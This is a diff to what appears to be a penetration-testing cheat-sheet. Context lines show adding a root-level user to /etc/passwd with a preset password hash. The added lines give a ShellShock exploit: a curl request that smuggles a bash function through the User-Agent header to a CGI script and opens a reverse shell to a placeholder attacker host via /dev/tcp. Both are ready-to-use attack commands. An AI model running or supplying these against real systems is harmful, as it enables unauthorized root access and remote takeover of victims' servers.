@@ -34,3 +34,9 @@ openssl passwd -1 -salt 1234 <password>
 # echo "test01:\$1\$1234\$LedaKjyvU08i2tNM5HGSg.:0:0:root:/root:/bin/bash" >> /etc/passwd
 # su test01
 ```
+
+ShellShock
+
+```shell
+curl -H "User-Agent: () { :; }; /bin/bash -c 'echo aaaa; bash -i >& /dev/tcp/<attacker ip>/<attacker port> 0>&1; echo zzzz;'" http://<target ip>/cgi-bin/admin.cgi | sed -n '/aaaa/{:a;n;/zzzz/b;p;ba}'
+```
